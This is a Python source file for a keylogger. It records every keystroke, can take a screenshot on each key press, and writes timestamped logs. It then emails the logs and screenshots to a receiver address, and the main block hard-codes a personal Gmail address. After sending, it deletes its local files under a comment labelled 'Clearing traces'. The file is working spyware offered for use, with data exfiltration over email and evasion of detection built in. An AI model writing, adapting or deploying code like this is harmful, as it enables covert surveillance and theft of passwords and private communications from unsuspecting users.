# Importing required modules
from keylogger.__init__ import*


class KeyLogger:
    # Vital Functions
    def __init__(self) -> None:
        # Records of keystrokes
        self.pressed_key = []
        self.sentence = ''
        # An initialiser
        self.count = 1

    def logger(self, event) -> None:
        '''Maintaing the detected keystrokes and move these strokes in the records in an appropriate way'''
        key = event.name
        if len(event.name) > 1:
            if event.name == 'space':
                key = " "
                self.sentence += key
            elif event.name == 'enter':
                self.pressed_key.append(
                    (time.asctime(time.localtime()), self.sentence))
                self.pressed_key.append((time.asctime(time.localtime()),
                                         f'{event.name.upper()} >> after --> {self.sentence}'))
                self.sentence = ''
            else:
                if self.sentence != '':
                    self.pressed_key.append(
                        (time.asctime(time.localtime()), self.sentence))
                    self.pressed_key.append((time.asctime(
                        time.localtime()), f'{event.name.upper()} >> after --> {self.sentence}'))
        else:
            self.sentence += key

    def scan_screen(self, event):
        'Taking screenshots when ever event occures'
        pyautogui.screenshot(
            f'{os.getcwd()}/images/img{self.count}.jpg')
        self.count += 1
        self.logger(event)

    def save(self) -> None:
        '''Saving the records in a text file'''
        with open(f'{os.getcwd()}/images/logs.txt', 'w') as file:
            for i in self.pressed_key:
                file.write(f'key enter is : \'{i[1]}\'\nTime : {i[0]}\n\n')

    def keylogger(self, receiver_email, hotkey='ctrl+d', ss: str = 'no', sender: str or None = None, password: str or None = None):
        '''
        receiver_email : Who will get the output
        hotkey : To stop keylogger,
            Default = "ctrl+d"
        ss : Sending screenshots,
            Default = "no"
        sender : Sender E-mail
        password : Sender's password
        '''
        # Making seperate directory

        # If directory exists, then removing the directory
        if os.path.exists(f'{os.getcwd()}/images'):
            shutil.rmtree(f'{os.getcwd()}/images')

        os.mkdir(f'{os.getcwd()}/images')

        # Detecting and then saving the keystrokes
        if ss.lower() == 'no':
            keyboard.on_press(self.logger)
        else:
            keyboard.on_press(self.scan_screen)

        keyboard.wait(hotkey=hotkey)
        self.save()

        # --Removing logs after sending it
        send_email(sender=sender, password=password, receiver_email=receiver_email,
                   sub='Keystrokes Recorded', attach=f'{os.getcwd()}/images/logs.txt')
        os.remove(f'{os.getcwd()}/images/logs.txt')

        # --Sending mail
        if ss.lower() != 'no':
            img = os.listdir(f'{os.getcwd()}/images')
            send_email(sender=sender, password=password,
                       receiver_email=receiver_email, sub='Keystroke\'s Screenshots', img=img)

        # --Clearing traces
        shutil.rmtree(f'{os.getcwd()}/images')


if __name__ == '__main__':
    logger = KeyLogger()
    logger.keylogger(receiver_email='siddharthchandel2004@gmail.com')
